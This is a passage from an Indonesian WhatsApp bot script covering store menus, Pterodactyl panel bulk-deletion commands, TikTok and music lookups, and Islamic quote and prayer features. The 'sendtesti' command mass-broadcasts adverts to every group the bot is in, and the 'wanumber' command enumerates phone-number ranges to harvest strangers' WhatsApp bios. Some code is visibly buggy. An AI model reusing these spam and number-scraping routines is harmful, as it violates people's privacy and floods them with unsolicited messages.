buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await conn.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "menu": {
// await loading()
  let teksnya = `( Arise weak one🔮 ${m.pushName} ) I am sungsu-cpanel. 𝖳𝗁𝗂𝗌 𝖻𝗈𝗍 𝗐𝖺𝗌 𝖽𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝖽 𝖻𝗒 𝗆𝗒 𝗈𝗐𝗇𝖾𝗋, Mr sung. 𝖳𝗁𝗂𝗌 𝗌𝖼𝗋𝗂𝗉𝗍 𝗂𝗌
╭──「 \`INFO BOT\` ⌝ 
│▢ Bot name: *${global.botname2}*
│▢ Version: ${versi}
│▢ Creator: ${namaOwner}
│▢ Total cmds: ${totalfitur()}
╰━──────────────━〢
┌─ 「 \`MENU NAVGATION\` 」
│▢ *Type .allmenu support button*
│▢ *Type .allmenu2 non-support button*
│▢ *Type .donate to support owner*
└─────────────────
⚠️ *Note:* 
This bot is  still in devolopment so
if there are errors pls report to owner!
© ${namaOwner} 
> Done by sungsu-cpanel`
await conn.sendMessage(m.chat, { 
  text: teksnya, 
  mentions: [m.sender], 
  contextInfo: { 
    isForwarded: true, 
    forwardedNewsletterMessageInfo: { 
      newsletterJid: global.idSaluran, 
      newsletterName: global.namaSaluran 
    }, 
    externalAdReply: { 
      title: `${botname} - ${versi}`, 
      body: `Runtime : ${runtime(process.uptime())}`, 
      thumbnailUrl: global.image.menu, 
      sourceUrl: linkSaluran, 
      mediaType: 1, 
      renderLargerThumbnail: true, 
    }, 
  } 
}, { quoted: m })

await conn.sendMessage(m.chat, { 
  audio: fs.readFileSync('./audio.mp3'), 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: m })
}
break

//==============================//
case "allmenu": case "all": {
// await loading()
  await conn.sendMessage(m.chat, {
    footer: `© WhatsApp sungsu tech`,
    buttons: [
      {
        buttonId: 'owner',
        buttonText: { displayText: 'Contact Owner' },
        type: 1
      },
      {
        buttonId: 'action',
        buttonText: { displayText: 'ini pesan interactiveMeta' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Beli Produk',
            sections: [
              {
                title: '🛍️ List Produk KyzzX Pedia',
                highlight_label: 'Recommended',
                rows: [
                  {
                    title: '📮 Panel Pterodactyl',
                    id: `${prefix}buypanel`
                  },
                  {
                    title: '📮 Admin Panel Pterodactyl',
                    id: `${prefix}buyadp`
                  },                
                  {
                    title: '☁️ Vps (Virtual Private Server)',
                    id: `${prefix}buyvps`
                  },
                  {
                    title: '📄 Script Bot WhatsApp',
                    id: `${prefix}buysc`
                  }, 
                  {
                    title:  '🌐 Digitalocean',
                    id: `${prefix}buydo`
                  }, 
                  {
                    title: '🚀 Jasa Jpm Pesan',
                    id: `${prefix}buyjasajpm`
                  },
                  {
                    title: '💳 Topup Saldo Ewallet',
                    id: `${prefix}topupsaldo`
                  },
                  {
                    title: '💎 Topup Diamonds',
                    id: `${prefix}topupdiamond`
                  }, 
                  {
                    title: '📲 Topup Pulsa',
                    id: `${prefix}isipulsa`
                  }                        
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    document: fs.readFileSync("./package.json"),
    fileName: `By ${namaOwner} </>`,
    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
    fileLength: 99999999,
    caption: menutxt,
    contextInfo: {
     isForwarded: true, 
     mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
     forwardedNewsletterMessageInfo: {
     newsletterJid: global.idSaluran,
     newsletterName: global.namaSaluran
     },    
      externalAdReply: {
        title: `${botname}`,
        thumbnailUrl: global.image.menu,
        sourceUrl: linkGrup,
        mediaType: 1,
        renderLargerThumbnail: true,
      },
    }
  }, { quoted: m })

  await conn.sendMessage(m.chat, {
    audio: fs.readFileSync('./audio.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: m })
}
break

case "allmenu2": case "all2":  {
// await loading()
await conn.sendMessage(m.chat, { 
  text: menutxt, 
  contextInfo: { 
    mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
    externalAdReply: { 
      title: `${botname} - ${versi}`, 
      body: `Runtime : ${runtime(process.uptime())}`, 
      thumbnailUrl: global.image.menu, 
      sourceUrl: linkSaluran, 
      mediaType: 1, 
      renderLargerThumbnail: true 
    } 
  } 
})

await conn.sendMessage(m.chat, { 
  audio: fs.readFileSync('./audio.mp3'), 
  mimetype: 'audio/mpeg', 
  ptt: true 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'clearadmin': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin , 48, 49, 50');
    }

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati proses penghapusan
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ${global.namaOwner}_*`);
                continue;
            }

            let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ${global.namaOwner}_*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
}
    break

case 'clearadmin2': {
 const argsString = body.trim();
 const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludeIds.length === 0) {
 return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin , 48, 49, 50');
 }

 try {
 let f = await fetch(domainav2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikeyV2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 for (let user of users) {
 let u = user.attributes;

 // Jika ID user ada di daftar pengecualian, lewati proses penghapusan
 if (excludeIds.includes(u.id.toString())) {
 m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ${global.namaOwner}_*`);
 continue;
 }

 let deleteUser = await fetch(domainV2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikeyV2,
 }
 });

 if (deleteUser.ok) {
 m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ${global.namaOwner}_*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }

 m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
}
 break
 
case 'clearserver': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver , 101, 102, 103');
    }

    try {
        // Mendapatkan daftar server
        let f = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
}
    break


case 'clearserver2': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver2 , 201, 202, 203');
    }

    try {
        // Mendapatkan daftar server dari server 2
        let f = await fetch(global.domainV2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikeyV2,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan di server 2.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domainV2 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikeyV2,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan di server 2: ' + error.message);
    }
}
    break
    
case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "unblock");
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: `${prefix}buypanel`
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: `${prefix}buyadp`
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: `${prefix}buyvps`
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: `${prefix}buysc`
                }, 
                {
                  title: 'Digitalocean',
                  id: `${prefix}buydo`
                  }, 
                  {
                    title: 'Jasa Jpm Pesan',
                    id: `${prefix}buyjasajpm`
                  },
                  {
                    title: 'Topup Saldo Ewallet',
                    id: `${prefix}topupsaldo`
                  },
                  {
                    title: 'Topup Diamonds',
                    id: `${prefix}topupdiamond`
                  }, 
                  {
                    title: 'Topup Pulsa',
                    id: `${prefix}isipulsa`
                  }                     
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "stt": case "searchtiktok": case "stiktok": {
  if (!text) return m.reply('Masukkan query pencarian!')
  let url = `https://api.siputzx.my.id/api/s/tiktok?query=${text}`
  let response = await fetch(url)
  let json = await response.json()
  if (!json.status) return m.reply('Gagal mencari video!')
  let hasil = json.data
  for (let i = 0; i < Math.min(hasil.length, 10); i++) {
    let videoUrl = hasil[i].play
    let caption = `🎥 *TikTok Video* 🎥\n\n${hasil[i].title}\n👤 ${hasil[i].author.nickname}\n👀 ${hasil[i].play_count} views\n❤️ ${hasil[i].digg_count} likes\n💬 ${hasil[i].comment_count} comments\n📢 ${hasil[i].share_count} shares\n\nLink: ${videoUrl}\n\n🔥 *Powered by ${global.packname}* 🔥`
    await conn.sendMessage(m.chat, { video: { url: videoUrl }, caption: caption }, { quoted: m })
    await delay(500)
  }
}
break

case "play": {
if (!text) return m.reply(example("dj tiktok"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+res.url)

if (anu.download.audio) {
let urlMp3 = anu.download.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "wanumber": case "searchno": case "searchnumber": case "carinomer": {
           	if (!text) return m.reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        m.reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = conn.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await conn.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        m.reply(`${text66}${nobio}${nowhatsapp}`)
        }
break

case "quotesislami": case "islam": {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    m.reply(`${arabic}\n${arti}`)
}
break

case "niatsholat": case "niatshalat": {
    if (!q) return m.reply(`Contoh Penggunaan :\nniatsholat Subuh\n\n List :\n• subuh\n• maghrib\n• dzuhur\n• isha\n• ashar`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    m.reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}
break

case "audiosurah": case "audiosurat": {
	let wrong = `_*Contoh Penggunaan :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
